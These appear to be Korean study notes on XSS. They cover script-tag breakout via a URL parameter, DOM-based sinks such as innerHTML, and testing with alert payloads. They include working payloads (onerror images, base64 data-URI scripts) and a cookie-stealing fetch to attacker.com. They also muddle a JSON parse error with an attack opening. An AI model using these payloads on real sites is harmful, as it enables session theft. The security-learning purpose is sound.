## (1)
>URL 뒤에 `<script></script>`를 붙이니까 페이지의 원래 HTML `<script>` 태그 일부가 화면에 노출됨
> 페이지 내의 기존 스크립트 일부가 "깨져서" 화면에 나타남


🔍삽입한 태그 때문에 브라우저가 DOM을 비정상적으로 파싱하고, 기존 `<script>` 블록이 종료되거나 망가져서 일부 코드가 **화면에 렌더링**

```
http://example.com/page?name=</script><script>alert(1)</script>
```

서버가 사용자 입력을 그대로 `<script>` 태그 안에 넣으면,

```
html
<script>
    var name = "<사용자 입력값>";  // 이 줄에 XSS 코드가 들어가면 파싱이 깨짐
</script>
```


* 첫 번째 `</script>`로 기존 `<script>`가 조기 종료
* 그 뒤의 `<script>alert(1)</script>`가 **브라우저에서 실행**
* 그 이후 남은 스크립트는 깨진 상태로 렌더링됨 → 그래서 HTML 일부가 "화면에 보이는" 현상이 발생

---

## ✅  XSS 공격  테스트


```url
http://example.com/page?name=</script><script>alert(1)</script>
```

또는 우회용 페이로드:

```url
http://example.com/page?name=</script><img src=x onerror=alert(1)>
```

**팝업이 뜨면 XSS 성공**. **Reflected XSS** 또는 **DOM-Based XSS** 중 하나일 가능성

---

## 📌 개발자 도구에서(F12) 미리 확인

1. \*\*페이지 소스(view-source:)\*\*에서 삽입 위치 확인 (스크립트 블록 안인지, HTML 태그 안인지)

2.
```
html
<script>
  var name = "</script><script>alert(1)</script>";
</script>
```

3. 콘솔 확인: 에러 메시지나 unexpected token 발생 여부

4. `innerHTML`이나 `document.write`로 출력 중이면 **DOM-Based XSS** 가능성도 있음

+ HTML 파서(브라우저의 DOM 해석기)의 동작 방식도 확인


---


## (2)
## `"unexpected token '<', '<!doctype' is not valid json"` 
위 오류는 보통 **JavaScript**에서 **JSON 파싱**을 시도할 때, **JSON 응답**이 아닌 **HTML** 형식의 응답(대개 오류 페이지)을 받은 경우 발생. 


* **`unexpected token '<'`** 오류 메시지는 **HTML 응답**에서 악성 스크립트를 삽입할 수 있는 기회를 제공
* ✅ `unexpected token '<'` 오류 발생 시 공격할 수 있는 XSS 페이로드 예시


#### 1. **기본적인 XSS 공격**

만약 HTML 문서 내에서 `<script>` 태그를 포함시킬 수 있다면, 공격자는 JavaScript 코드를 실행시킬 수 있습니다.

```html
<script>alert('XSS');</script>
```

이 코드는 **브라우저**에서 실행

#### 2. **쿠키 탈취를 위한 XSS 페이로드**

공격자는 악성 스크립트를 사용하여 **쿠키**를 **탈취**할 수 있습니다. 다음과 같은 XSS 페이로드를 사용할 수 있습니다:

```html
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>
```

사용자의 **쿠키** 정보를 **attacker.com**으로 전송

#### 3. **DOM-based XSS (DOM을 통한 XSS)**

만약 페이지 내에서 **사용자 입력을 동적으로 처리**하고 그 데이터를 HTML에 삽입한다면, XSS 공격이 발생

```html
<input type="text" id="search" value="foo">
<script>
  document.getElementById('search').value = '<img src="x" onerror="alert(1)">';
</script>
```

**이미지 오류**를 유발하여 **`onerror`** 이벤트 핸들러가 \*\*`alert(1)`\*\*을 실행.


### **사용자 입력을 동적으로 처리하는지 확인하는 방법**

1. **폼 입력 필드**나 **검색창**에서 입력한 값이 즉시 페이지에 반영되는지 확인.

   * 예를 들어, 사용자가 **검색어**를 입력하면, 페이지가 새로고침 없이 **검색어를 포함한 결과**를 바로 표시하는 경우, 해당 데이터는 동적으로 처리.
  
2. **JavaScript를 통해 값이 DOM에 삽입되는지 확인**:

   * **웹 페이지의 HTML 구조**를 살펴보면, **브라우저 개발자 도구**(F12)를 열고 **Elements** 탭에서 HTML을 실시간으로 확인.
   * 예를 들어, **사용자가 검색어**를 입력한 후, JavaScript 코드가 **`document.getElementById()`** 또는 \*\*`innerHTML`\*\*을 사용하여 입력 값을 HTML 페이지에 삽입하는 방식이라면, 그 페이지는 동적 처리.


#### **동적 처리 예시**

1. **사용자 입력 받기**: 예를 들어, 검색창에 사용자가 입력한 값을 페이지에 반영한다면.

   ```html
   <input type="text" id="search">
   <button onclick="search()">Search</button>
   <div id="result"></div>
   ```

2. **JavaScript 코드**: 사용자가 **Search** 버튼을 클릭하면, 검색어를 가져와서 결과를 페이지에 보여주는 코드.

   ```javascript
   function search() {
       var query = document.getElementById('search').value;  // 검색어 가져오기
       document.getElementById('result').innerHTML = query;  // 검색어를 결과에 반영
   }
   ```

3. **동적으로 HTML에 삽입**: 사용자가 입력한 검색어는 `document.getElementById('result').innerHTML`을 통해 \*\*`<div id="result"></div>`\*\*에 삽입. **이 값은 HTML로 직접 삽입**되므로, 사용자가 입력한 값에 악성 코드가 포함되면 XSS 공격에 취약.

---

### **사용자 입력을 HTML에 삽입하는 방법**


#### **1. innerHTML을 통한 삽입**

`innerHTML`은 **HTML 요소의 콘텐츠**를 **동적으로 변경**할 때 사용되므로, **사용자가 입력한 값**이 **HTML로 해석**되기 때문에 XSS 공격에 취약.

```javascript
var userInput = document.getElementById('userInput').value;  // 사용자의 입력값
document.getElementById('output').innerHTML = userInput;  // 입력값을 HTML에 삽입
```

* **위 코드**는 사용자가 **`<input>`** 필드에 입력한 값을 \*\*`<div id="output">`\*\*에 삽입.
* 만약 사용자가 `"<script>alert('XSS')</script>"`와 같은 값을 입력하면, **스크립트 코드**가 실행.
**`innerText`** 또는 \*\*`textContent`\*\*는 HTML 태그를 포함한 텍스트를 삽입할 수 없으며, **순수 텍스트**만을 삽입 가능.


#### 2. **이벤트 핸들러를 통한 XSS**

사용자가 클릭하거나 다른 이벤트를 트리거할 때 XSS. 
예를 들어, `<a>` 태그나 `<img>` 태그에 **이벤트 핸들러**를 삽입.

```html
<img src="x" onerror="alert('XSS');">
```

**이미지 로드 오류**를 이용해 **`onerror`** 이벤트가 실행될 때 \*\*`alert('XSS')`\*\*가 실행

#### 3. **Base64로 인코딩된 스크립트 삽입**

만약 `<script>` 태그를 직접 삽입할 수 없다면, Base64 인코딩을 사용하여 **스크립트**를 삽입.
예를 들어:

```html
<script src="data:text/javascript;base64,dmFyIG5hbWUgPSAic3RhY2sgY2FwIjs="></script>
```

위의 페이로드는 **Base64**로 인코딩된 **JavaScript** 코드가 실행.

```javascript
var name = "stack cap";
```

#### 4. **JSON 응답이 잘못 처리된 경우의 XSS**

`unexpected token '<'` 오류는 **JSON 데이터**를 예상했는데 **HTML 페이지**가 반환되는 경우, **HTML 응답을 JavaScript에서 처리**하는 상황에서 **XSS 공격**이 발생. 
예를 들어:

```javascript
fetch('/api/data')
  .then(response => response.json())
  .then(data => {
    document.getElementById('output').innerHTML = data.message;
  })
  .catch(error => {
    console.error(error);
  });
```

여기서 `data.message`가 HTML로 반환되는 경우, 예를 들어:

```json
{
  "message": "<script>alert('XSS')</script>"
}
```

위와 같은 JSON 응답이 반환되면, \*\*`data.message`\*\*가 HTML로 삽입되어 **XSS**가 실행.
* innerhtml과 fetch(웹 서버에 GET 또는 POST 요청을 보내고, 서버에서 돌아오는 응답을 받아 JSON, HTML, 텍스트 등으로 반환)



